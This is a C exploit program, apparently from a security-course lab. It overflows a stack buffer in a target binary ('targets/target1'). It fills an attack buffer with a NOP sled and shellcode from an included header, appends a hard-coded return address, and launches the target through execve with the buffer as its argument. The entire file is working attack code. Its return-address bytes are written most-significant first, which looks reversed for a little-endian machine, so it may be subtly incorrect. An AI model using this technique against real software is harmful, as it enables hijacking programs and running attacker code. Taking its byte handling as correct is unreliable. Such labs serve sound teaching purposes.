#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define SHELL_SIZE 45
#define BUF_TO_RET 120
#define BUF_SIZE 125
#define BUF_ADDR 0x2021fe10

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	int i;
	unsigned char attack_buffer[BUF_SIZE];
	
	for (i = 0; i < BUF_TO_RET - SHELL_SIZE; i++)
		attack_buffer[i] = 0x90;
	for (i = 0; i < SHELL_SIZE; i++)
		attack_buffer[BUF_TO_RET - SHELL_SIZE + i] = shellcode[i];
	
	attack_buffer[BUF_TO_RET] = (char) ((BUF_ADDR & 0xFF000000) >> 24);
	attack_buffer[BUF_TO_RET + 1] = (char) ((BUF_ADDR & 0x00FF0000) >> 16);
	attack_buffer[BUF_TO_RET + 2] = (char) ((BUF_ADDR & 0x0000FF00) >> 8);
	attack_buffer[BUF_TO_RET + 3] = (char) (BUF_ADDR & 0xFF);
	attack_buffer[BUF_TO_RET + 4] = '\0';

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
